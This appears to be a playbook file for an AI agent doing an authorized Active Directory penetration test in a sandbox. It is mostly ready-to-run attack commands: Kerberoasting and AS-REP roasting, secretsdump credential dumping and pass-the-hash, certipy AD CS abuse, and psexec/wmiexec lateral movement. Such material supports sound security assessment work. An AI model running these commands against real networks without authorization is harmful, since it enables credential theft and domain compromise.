---
name: active-directory
description: AD attack surface playbook for the sandbox: impacket, certipy, LDAP enumeration, Kerberos abuse, and AD CS paths.
---

# Active Directory

This playbook assumes an authorized internal assessment. The sandbox image
ships the tools named below; verify with `command -v` before relying on one.

## Available in the image

- `impacket-*` — `GetNPUsers`, `GetUserSPNs`, `secretsdump`, `psexec`,
  `wmiexec`, `smbclient`, `lookupsid`
- `certipy` — AD CS enumeration and exploitation (`find`, `req`, `auth`,
  `relay`, `template`)
- `ldapdomaindump` — LDAP dump to HTML/JSON
- `nmap` / `smbclient` / `rpcclient` for discovery

## Discovery

```bash
nmap -Pn -p 88,389,445,636,3268,5985 <dc>
ldapdomaindump -u 'DOMAIN\user' -p 'password' <dc>
impacket-lookupsid 'DOMAIN/user:password@<dc>'
```

## Kerberos

```bash
# AS-REP roastable accounts
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip <dc> -format hashcat -no-pass

# Kerberoastable SPNs
impacket-GetUserSPNs DOMAIN/user:password -dc-ip <dc> -request

# Crack offline with hashcat modes 18200 (AS-REP) / 13100 (TGS)
```

## Credential access

```bash
impacket-secretsdump 'DOMAIN/user:password@<host>'
impacket-secretsdump -hashes :NTHASH 'DOMAIN/user@<host>'
```

## AD CS

```bash
certipy find -u user@domain -p password -dc-ip <dc> -vulnerable -stdout
certipy req -u user@domain -p password -ca <CA> -template <Template> -dc-ip <dc>
certipy auth -pfx user.pfx -dc-ip <dc>
```

ESC1/ESC8 paths require a vulnerable template or HTTP enrollment; do not
assume they exist — confirm with `certipy find` output first.

## Lateral movement

```bash
impacket-psexec 'DOMAIN/user:password@<host>'
impacket-wmiexec 'DOMAIN/user:password@<host>'
```

## Reporting

Record the account, host, command, and evidence for every step. A credential
obtained without a reproducible command is not a finding.
